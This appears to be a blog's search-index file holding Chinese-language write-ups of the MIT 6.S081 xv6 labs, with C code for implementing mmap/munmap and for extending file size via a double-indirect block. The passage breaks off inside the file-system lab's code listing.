<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>6.S081 lab10 mmap</title>
      <link href="2021/03/03/6-s081-lab10-mmap/"/>
      <url>2021/03/03/6-s081-lab10-mmap/</url>
      
        <content type="html"><![CDATA[<p><code>mmap</code>和<code>munmap</code>系统调用允许UNIX程序对其地址空间进行更为细致的控制。它们可用于在进程间共享内存，将文件映射到进程地址空间，并作为用户级<code>page fault</code>方案的一部分。在本实验室中，我们将在<code>xv6</code>中添加<code>mmap</code>和<code>munmap</code>系统调用，重点是<code>memory-mapped files</code>。</p><a id="more"></a><h1 id="Lab-mmap"><a href="#Lab-mmap" class="headerlink" title="Lab: mmap"></a>Lab: mmap</h1><p><code>mmap</code>的API如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params">           <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>在<code>xv6</code>中，<code>addr</code>始终为0，所以由<code>kernel</code>自行判断应当map的地址；<code>prot</code>表示了mapped memory的 R、W、X权限，<code>flags</code>为<code>MAP_SHARED</code>或者<code>MAP_PRIVATE</code>，前者表示对mapped memory的修改应写回文件，后者则不需要；<code>offer</code>永远为0，不用处理文件的偏移量；mmap成功将返回对应内存起始地址；失败返回<code>0xffffffffffffffff</code>。</p><p><code>munmap(addr, length)</code>需要将从addr开始的长度为<code>length</code>的内存<code>unmap</code>。实验指导书保证被<code>munmap</code>的这段内存位于<code>mmap</code>内存区间的头部/尾部或者是全部，<code>munmap</code>不会在中间挖一个洞；当内存是以<code>MAP_SHARED</code>模式被<code>mmap</code>时，需要先将修改写回文件。</p><p>看完了对于<code>mmap</code>和<code>munmap</code>的要求，发现其实测试没有一些比较难的<code>case</code>，为我们的实现提供了便利。</p><p>之后，就可以跟着hints完成实验：</p><ul><li><p>首先添加<code>mmap</code>和<code>munmap</code>的系统调用声明，并且在<code>Makefile</code>中加入<code>_mmaptest</code>。</p></li><li><p>对mapped memory要使用lazy allocation，就像在之前的实验中那样，这样子使得我们可以在物理内存有限的情况下<code>mmap</code>尽可能大的文件。</p></li><li><p>记录<code>mmap</code>为每个进程map文件的情况，例如地址，长度，权限，对应的文件等等。由于<code>xv6</code>没有真正的内存分配器，所以我们使用一个定长的数组去存储，16就足够了。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">VMA</span> {</span></span><br><span class="line">  <span class="keyword">int</span> used;</span><br><span class="line">  uint64 addr;</span><br><span class="line">  uint64 <span class="built_in">end</span>;</span><br><span class="line">  <span class="keyword">int</span> prot;</span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line">  <span class="keyword">int</span> offset;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// in struct proc</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">VMA</span> <span class="title">vma</span>[<span class="title">NVMA</span>];</span></span><br><span class="line">uint64 mmap_start;</span><br></pre></td></tr></tbody></table></figure></li><li><p>实现<code>mmap</code>，从用户地址空间找到空闲处map文件，修改对应的<code>VMA</code>结构体记录，当对文件<code>mmap</code>后，应当增加文件的引用计数(<code>filedup</code>)，这样当文件被关闭时，<code>VMA</code>持有的文件指针才不会失效。</p><p>最重要的就是找到合适的空闲地址，用于<code>mmap</code>。<code>xv6</code>的用户地址空间如下图：</p><p><img src="image-20210303172730172.png" alt="image-20210303172730172"></p><p>最顶部是<code>trampoline</code>和<code>trapframe</code>，它们占用了两个page，和<code>stack</code>之间有很大的空闲地址，我们可以将文件map到<code>trapframe</code>之下，不断向下增长，<code>mmap_start</code>记录着<code>trapframe</code>下可用于<code>mmap</code>的起始地址，初始值为<code>PGROUNDDOWN(MAXVA - (2 * PGSIZE))</code>。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line">sys_mmap(<span class="keyword">void</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">int</span> length, prot, flags, fd;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line">  <span class="keyword">if</span>(argint(<span class="number">1</span>, &amp;length) &lt; <span class="number">0</span> || argint(<span class="number">2</span>, &amp;prot) &lt; <span class="number">0</span> </span><br><span class="line">    || argint(<span class="number">3</span>, &amp;flags) &lt; <span class="number">0</span> || argfd(<span class="number">4</span>, &amp;fd, &amp;f) &lt; <span class="number">0</span>) {</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (!f-&gt;writable &amp;&amp; flags == MAP_SHARED &amp;&amp; (prot &amp; PROT_WRITE)) {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">// find a vma</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> = <span class="title">myproc</span>();</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">VMA</span> *<span class="title">v</span>;</span></span><br><span class="line">  <span class="keyword">for</span> (v = p-&gt;vma; v &lt; p-&gt;vma + NVMA; v++) {</span><br><span class="line">    <span class="keyword">if</span>(!v-&gt;used) {</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span>(v == p-&gt;vma + NVMA) {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  filedup(f);</span><br><span class="line">  v-&gt;addr = PGROUNDDOWN(p-&gt;mmap_start - length);</span><br><span class="line">  v-&gt;<span class="built_in">end</span> = v-&gt;addr + length;</span><br><span class="line">  p-&gt;mmap_start = v-&gt;addr;</span><br><span class="line"></span><br><span class="line">  v-&gt;used = <span class="number">1</span>;</span><br><span class="line">  v-&gt;f = f;</span><br><span class="line">  v-&gt;prot = prot;</span><br><span class="line">  v-&gt;flags = flags;</span><br><span class="line">  v-&gt;offset = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v-&gt;addr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>当发生<code>page fault</code>时，为其分配一个真实的物理页面，使用<code>readi</code>将文件内容读入内存，然后将物理页面map到用户地址空间，记得正确设置页面的权限。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (r_scause() == <span class="number">13</span> || r_scause() == <span class="number">15</span>) {</span><br><span class="line">    uint64 va = r_stval();</span><br><span class="line">    <span class="keyword">if</span> (va &gt; MAXVA) {</span><br><span class="line">      p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      <span class="keyword">if</span>(mmap_alloc(p-&gt;pagetable, va) &lt; <span class="number">0</span>) {</span><br><span class="line">        p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">mmap_alloc(<span class="keyword">pagetable_t</span> pagetable, uint64 va)</span><br><span class="line">{ </span><br><span class="line">  <span class="keyword">char</span> *mem;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> = <span class="title">myproc</span>();</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">VMA</span> *<span class="title">v</span>;</span></span><br><span class="line">  <span class="comment">// find vma struct</span></span><br><span class="line">  <span class="keyword">for</span> (v = p-&gt;vma; v &lt; p-&gt;vma + NVMA; v++) {</span><br><span class="line">    <span class="keyword">if</span>(v-&gt;used &amp;&amp; va &gt;= v-&gt;addr &amp;&amp; va &lt; v-&gt;<span class="built_in">end</span>) {</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (v == p-&gt;vma + NVMA) {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  mem = kalloc();</span><br><span class="line">  <span class="keyword">if</span>(mem == <span class="number">0</span>){</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">memset</span>(mem, <span class="number">0</span>, PGSIZE);</span><br><span class="line">  begin_op();</span><br><span class="line">  ilock(v-&gt;f-&gt;ip);</span><br><span class="line">  <span class="keyword">int</span> len;</span><br><span class="line">  <span class="keyword">if</span>((len = readi(v-&gt;f-&gt;ip, <span class="number">0</span>, (uint64)mem, va - v-&gt;addr, PGSIZE)) &lt; <span class="number">0</span>) {</span><br><span class="line">    iunlock(v-&gt;f-&gt;ip);</span><br><span class="line">    end_op();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  iunlock(v-&gt;f-&gt;ip);</span><br><span class="line">  end_op();</span><br><span class="line">  <span class="keyword">int</span> f = PTE_U | (v-&gt;prot &lt;&lt; <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span>(mappages(pagetable, va, PGSIZE, (uint64)mem, f) != <span class="number">0</span>) {</span><br><span class="line">    kfree(mem);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>实现<code>munmap</code>，找到对应的<code>VMA</code>，使用<code>uvmunmap</code> unmap对应的内存，当一个<code>mmap</code>的所有内存都被unmap时，需要减少对应文件的引用计数；如果内存被修改过，且是以<code>MAP_SHARED</code>模式被<code>mmap</code>，那么需要先将内存内容写回文件。理想态下，我们只应当写回<code>dirty page</code>，但是测试中不会检查这一点，所以将所有内存写回文件即可了。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span>*</span></span><br><span class="line"><span class="class"><span class="title">fileundup</span>(<span class="title">struct</span> <span class="title">file</span> *<span class="title">f</span>)</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  acquire(&amp;ftable.lock);</span><br><span class="line">  <span class="keyword">if</span>(f-&gt;ref &lt; <span class="number">1</span>)</span><br><span class="line">    panic(<span class="string">"filedup"</span>);</span><br><span class="line">  f-&gt;ref--;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">release</span>(&amp;ftable.lock);</span><br><span class="line">  <span class="keyword">return</span> f;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">uint64</span><br><span class="line">sys_munmap(<span class="keyword">void</span>)</span><br><span class="line">{</span><br><span class="line">  uint64 addr;</span><br><span class="line">  <span class="keyword">int</span> length;</span><br><span class="line">  <span class="keyword">if</span>(argaddr(<span class="number">0</span>, &amp;addr) &lt; <span class="number">0</span> || argint(<span class="number">1</span>, &amp;length) &lt; <span class="number">0</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> s_munmap(addr, length);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">uint64</span><br><span class="line">s_munmap(uint64 addr, <span class="keyword">int</span> length) {</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> = <span class="title">myproc</span>();</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">VMA</span> *<span class="title">v</span>;</span></span><br><span class="line">  <span class="keyword">for</span> (v = p-&gt;vma; v &lt; p-&gt;vma + NVMA; v++) {</span><br><span class="line">    <span class="keyword">if</span>(v-&gt;used &amp;&amp; v-&gt;addr &lt;= addr &amp;&amp; addr + length &lt;= v-&gt;<span class="built_in">end</span>) {</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span>(v == p-&gt;vma + NVMA) {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  uint64 <span class="built_in">end</span> = addr + length;</span><br><span class="line">  uint64 _addr = addr;</span><br><span class="line">  <span class="keyword">while</span> (addr &lt; <span class="built_in">end</span>) {</span><br><span class="line">    <span class="comment">// if already load in</span></span><br><span class="line">    <span class="keyword">if</span>(walkaddr(p-&gt;pagetable, addr)) {</span><br><span class="line">      <span class="keyword">if</span>(v-&gt;flags == MAP_SHARED &amp;&amp; v-&gt;f-&gt;writable) {</span><br><span class="line">        begin_op();</span><br><span class="line">        ilock(v-&gt;f-&gt;ip);</span><br><span class="line">        <span class="keyword">int</span> <span class="built_in">size</span> = <span class="built_in">min</span>(<span class="built_in">end</span>-addr, PGSIZE);</span><br><span class="line">        <span class="keyword">if</span>(writei(v-&gt;f-&gt;ip, <span class="number">1</span>, addr, addr - v-&gt;addr, <span class="built_in">size</span>) &lt; <span class="built_in">size</span>) {</span><br><span class="line">          iunlock(v-&gt;f-&gt;ip);</span><br><span class="line">          end_op();</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        }</span><br><span class="line">        iunlock(v-&gt;f-&gt;ip);</span><br><span class="line">        end_op();</span><br><span class="line">      }</span><br><span class="line">      uvmunmap(p-&gt;pagetable, addr, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    addr += PGSIZE;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span>(_addr == v-&gt;addr) {</span><br><span class="line">    v-&gt;addr += length;</span><br><span class="line">  } <span class="keyword">else</span> <span class="keyword">if</span>(_addr + length == v-&gt;<span class="built_in">end</span>) {</span><br><span class="line">    v-&gt;<span class="built_in">end</span> -= length;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (v-&gt;addr == v-&gt;<span class="built_in">end</span>) {</span><br><span class="line">    fileundup(v-&gt;f);</span><br><span class="line">    v-&gt;used = <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>实现时遇到两个坑：</p><ul><li>在<code>uvmunmap</code>时，首先要判断该内存是否真的被<code>lazy allocation</code>了，否则要像<code>lazy</code>lab中一样，修改<code>uvmunmap</code>，我觉得这样实现比较ugly，因为破坏了<code>uvmunmap</code>发现错误的功能。</li><li>最开始实现时，只要<code>v-&gt;flags == MAP_SHARED</code>就将文件写回，结果在<code>forktest</code>中父子进程内存内容不一致，查看<code>forktest</code>代码发现原来创建的只读文件，只要<code>prot</code>不标志为可写，那么制度文件也是可以用<code>MAP_SHARED</code>模式进行<code>mmap</code>的。所以还要加上<code>v-&gt;f-&gt;writable</code>或者<code>prot &amp; PROT_WRITE</code>。</li></ul></li><li><p>修改<code>exit</code>代码，使得<code>exit</code>被调用后，unmap所有被<code>mmap</code>的内存。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">VMA</span> *<span class="title">v</span>;</span></span><br><span class="line"><span class="keyword">for</span> (v = p-&gt;vma; v &lt; p-&gt;vma + NVMA; v++) {</span><br><span class="line">  <span class="keyword">if</span>(v-&gt;used) {</span><br><span class="line">    <span class="keyword">if</span> (s_munmap(v-&gt;addr, v-&gt;<span class="built_in">end</span> - v-&gt;addr) &lt; <span class="number">0</span>) {</span><br><span class="line">      panic(<span class="string">"exit:munmap"</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>修改fork代码，使得子进程拥有和父进程相同的<code>mmap</code>文件。可以直接为子进程分配新的物理内存用于<code>mmap</code>，不用共享相同物理页面。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">np-&gt;mmap_start = p-&gt;mmap_start;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NVMA; i++) {</span><br><span class="line">  np-&gt;vma[i].addr = p-&gt;vma[i].addr;</span><br><span class="line">  np-&gt;vma[i].<span class="built_in">end</span> = p-&gt;vma[i].<span class="built_in">end</span>;</span><br><span class="line">  np-&gt;vma[i].used = p-&gt;vma[i].used;</span><br><span class="line">  np-&gt;vma[i].flags = p-&gt;vma[i].flags;</span><br><span class="line">  np-&gt;vma[i].prot = p-&gt;vma[i].prot;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p-&gt;vma[i].used &amp;&amp; p-&gt;vma[i].f) {</span><br><span class="line">    np-&gt;vma[i].f = filedup(p-&gt;vma[i].f);</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><p>这样mmap lab就完成了，最终代码见<a href="https://github.com/Jason210314/xv6-labs-2020/tree/mmap">GitHub仓库</a>。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6.S081 </tag>
            
            <tag> mmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.S081 lab9 fs</title>
      <link href="2021/03/02/6-s081-lab9-fs/"/>
      <url>2021/03/02/6-s081-lab9-fs/</url>
      
        <content type="html"><![CDATA[<p>本次试验中，将为<code>xv6</code>添加大文件和符号链接的支持。</p><h1 id="Large-files"><a href="#Large-files" class="headerlink" title="Large files"></a>Large files</h1><p>本关需要为<code>xv6</code>添加对大文件的支持。<code>xv6</code>的inode默认使用12个直接块指针和1个间接块指针（指向一个存储着块指针的数据块），所以<code>xv6</code>支持的最大文件尺寸是<code>12 + 1*256=268</code>个block。我们需要将一个直接块指针修改为双重间接块指针（执行一个存储着间接块指针的数据块），将<code>xv6</code>的最大文件尺寸扩展到<code>11 + 1*256 + 1*256*256= 65803</code>个block。</p><a id="more"></a><p>首先我们修改<code>kernel/fs.h</code>中的相关宏定义：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NDIRECT 11</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NINDIRECT (BSIZE / sizeof(uint))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NDOUBLEINDIRECT ((BSIZE / sizeof(uint)) * (BSIZE / sizeof(uint)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXFILE (NDIRECT + NINDIRECT + NDOUBLEINDIRECT)</span></span><br></pre></td></tr></tbody></table></figure><p>然后修改<code>dinode</code>和<code>inode</code>中的地址数组定义：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint addrs[NDIRECT+<span class="number">2</span>];</span><br></pre></td></tr></tbody></table></figure><p>接下来修改<code>bmap</code>函数，该函数用于将一个文件的逻辑块号转换为设备的物理块号，类似于虚实地址转换：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> uint</span><br><span class="line">bmap(struct inode *ip, uint bn)</span><br><span class="line">{</span><br><span class="line">  uint addr, *a;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">bp</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(bn &lt; NDIRECT){</span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[bn]) == <span class="number">0</span>)</span><br><span class="line">      ip-&gt;addrs[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  }</span><br><span class="line">  bn -= NDIRECT;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(bn &lt; NINDIRECT){</span><br><span class="line">    <span class="comment">// Load indirect block, allocating if necessary.</span></span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[NDIRECT]) == <span class="number">0</span>)</span><br><span class="line">      ip-&gt;addrs[NDIRECT] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    bp = bread(ip-&gt;dev, addr);</span><br><span class="line">    a = (uint*)bp-&gt;data;</span><br><span class="line">    <span class="keyword">if</span>((addr = a[bn]) == <span class="number">0</span>){</span><br><span class="line">      a[bn] = addr = balloc(ip-&gt;dev);</span><br><span class="line">      log_write(bp);</span><br><span class="line">    }</span><br><span class="line">    brelse(bp);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  }</span><br><span class="line">  bn -= NINDIRECT;</span><br><span class="line">  <span class="keyword">if</span>(bn &lt; NDOUBLEINDIRECT){</span><br><span class="line">    <span class="comment">// Load double-indirect block, allocating if necessary.</span></span><br><span class="line">    <span class="keyword">if</span>((addr = ip-&gt;addrs[NDIRECT+<span class="number">1</span>]) == <span class="number">0</span>)</span><br><span class="line">      ip-&gt;addrs[NDIRECT+<span class="number">1</span>] = addr = balloc(ip-&gt;dev);</span><br><span class="line">    bp = bread(ip-&gt;dev, addr);</span><br><span class="line">    a = (uint*)bp-&gt;data;</span><br><span class="line">    uint level1 = bn / NINDIRECT;</span><br><span class="line">    <span class="keyword">if</span>((addr = a[level1]) == <span class="number">0</span>){</span><br><span class="line">      a[level1] = addr = balloc(ip-&gt;dev);</span><br><span class="line">      log_write(bp);</span><br><span class="line">    }</span><br><span class="line">    brelse(bp);</span><br><span class="line"></span><br><span class="line">    bp = bread(ip-&gt;dev, addr);</span><br><span class="line">    a = (uint*)bp-&gt;data;</span><br><span class="line">    uint level2 = bn % NINDIRECT;</span><br><span class="line">    <span class="keyword">if</span>((addr = a[level2]) == <span class="number">0</span>){</span><br><span class="line">      a[level2] = addr = balloc(ip-&gt;dev);</span><br><span class="line">      log_write(bp);</span><br><span class="line">    }</span><br><span class="line">    brelse(bp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  panic(<span class="string">"bmap: out of range"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后修改<code>itrunc</code>函数，在truncate文件时，释放我们新添加的双重间接数据块（不要忘了释放指针块本身）：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 